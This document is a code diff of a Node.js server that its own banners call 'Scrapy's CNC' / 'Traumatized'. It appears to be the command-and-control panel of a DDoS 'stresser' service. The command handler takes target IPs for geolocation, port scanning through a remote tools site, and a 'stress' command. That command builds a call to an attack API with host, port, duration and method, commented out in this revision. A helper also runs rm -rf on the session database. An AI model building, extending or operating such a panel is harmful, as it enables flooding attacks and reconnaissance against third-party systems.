@@ -11,6 +11,7 @@ const server = new Net.Server();
 const config = require("./config/strings.js");
 const crud = require("./auth/crud.js");
 const auth = require("./auth/login.js");
+const banners = require("./extra/banners");
 
 const sleep = (milliseconds) => {
     return new Promise(resolve => setTimeout(resolve, milliseconds))
@@ -22,8 +23,8 @@ server.listen(port, function() {
 });
 
 server.on('connection', function(socket) {
-    set_title("Welcome To Scrapy's CNC!", socket);
-    socket.write("Traumatized\r\n")
+    //set_title("Welcome To Scrapy's CNC!", socket);
+    socket.write(config.Colors.movingtext2 + "Traumatized\r\n" + config.hostname);
     
     console.log("A new connection has been established");
     var socket_port = socket.remotePort;
@@ -35,7 +36,7 @@ server.on('connection', function(socket) {
         //Cleaning data
         let cleanSTR = chunk.toString().replace(/(\r\n|\n|\r)/gm,"");
 
-        set_title("Scrapy's CNC! | APIs: 4", socket);
+        //set_title("Scrapy's CNC! | APIs: 4", socket);
 
         /*
         Command handler
@@ -62,22 +63,34 @@ server.on('connection', function(socket) {
             if(cleanSTR.startsWith("testing")) {
                 socket.write("Testing\r\n" + config.hostname);
             } else if(cleanSTR.startsWith("methods")) {
-                f('https://scrapy.tech/methods.txt').then(res => res.text());
-                socket.write(res + config.hostname);
+                f('https://scrapy.tech/methods.txt').then(res => socket.write(res.text()));
             } else if(cleanSTR.startsWith("geo")) {
-                ip = config.CurrentCMD.arg[1];
-                f('https://scrapy.tech/tools/?action=geoip&q='+ip).then(res => res.text())
-                socket.write(res + config.hostname)
+                let ip = config.CurrentCMD.arg[1];
+                f('https://scrapy.tech/tools/?action=geoip&q='+ip).then(res => res.text()).then(body => {
+                    if(body) {
+                        socket.write(banners.geoBanner() + body + config.hostname);
+                    } else {
+                        socket.write("[x] Error, Couldn't fetch geo results")
+                        console.log("[x] Error, Couldn't fetch geo results")
+                    }
+                })
             } else if(cleanSTR.startsWith("pscan")) {
-                ip = config.CurrentCMD.arg[1]
-                f('https://scrapy.tech/tools/?action=pscan&q='+ip).then(res => res.text())
-                socket.write(res + config.hostname)
+                let ip = config.CurrentCMD.arg[1]
+                f('https://scrapy.tech/tools/?action=portscan&q='+ip).then(res => res.text()).then(body => {
+                    if(body) {
+                        socket.write(body + "\r\n" + config.hostname);
+                        console.log(body);
+                    } else {
+                        socket.write("[x] Error. Couldn't fetch PortScanner results!\r\n" + config.hostname)
+                        console.log("[x] Error. Couldn't fetch PortScanner results!");
+                    }
+                })
             } else if(cleanSTR.startsWith("stress")) {
-                ip = config.CurrentCMD.arg[1]
-                port = config.CurrentCMD.arg[2]
-                time = config.CurrentCMD.arg[3]
-                method = config.CurrentCMD.arg[4]
-                f('https://api.com/api.php?key=key&host='+ip+"&port="+port+"&time="+time+"&method="+method)
+                let ip = config.CurrentCMD.arg[1]
+                let port = config.CurrentCMD.arg[2]
+                let time = config.CurrentCMD.arg[3]
+                let method = config.CurrentCMD.arg[4]
+                // f('https://api.com/api.php?key=key&host='+ip+"&port="+port+"&time="+time+"&method="+method)
             } else if(cleanSTR.startsWith("exit")) {
                 socket.write("Closing Traumatized.")
                 socket.write(config.Colors.Clear)
@@ -112,3 +125,9 @@ server.on('connection', function(socket) {
         console.log("[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n");
     });
 });
+
+function reset_sessions() {
+    exec("rm -rf db/current.db; touch db/current.db; chmod 777 db/current.db", function(error, stdin, stderr) {
+        console.log(stdin)
+    })
+}
